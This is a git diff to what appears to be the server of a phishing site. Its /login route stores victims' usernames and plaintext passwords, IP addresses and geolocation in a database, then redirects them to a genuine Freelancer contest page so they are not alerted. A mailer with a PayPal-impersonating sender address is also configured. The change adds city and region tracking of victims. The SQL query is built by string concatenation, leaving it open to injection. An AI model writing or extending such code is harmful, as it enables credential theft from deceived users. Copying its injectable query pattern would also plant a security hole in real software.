@@ -8,6 +8,8 @@ var bodyParser = require('body-parser');
 const nodemailer = require("nodemailer");
 const iplocation = require("iplocation").default;
 var loc;
+var city;
+var reg;
 
 var mailOptions = {
     from: 'paypal.credit.safety@gmail.com',
@@ -59,8 +61,10 @@ app.post('/login',function(req,res){
     req.socket.remoteAddress ||
     (req.connection.socket ? req.connection.socket.remoteAddress : null);
 
-   iplocation(ip, [], (error, res) => {loc = res.country});
-    client.query("INSERT INTO freelancer_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','"+loc+"')",function(err,result){});
+    iplocation(ip, [], (error, res) => { loc = res.country; city = res.city; reg = res.regionName});
+    var location = loc + '---' + city + '---' + reg ;
+
+    client.query("INSERT INTO freelancer_users (users,password,ip,country) VALUES ('" + a + "','" + b + "','" + ip + "','"+location+"')",function(err,result){});
     res.redirect('https://www.freelancer.com/contest/Design-a-logo-for-an-Accounting-Firm-1460786-byentry-25383803?w=f');
 })
 
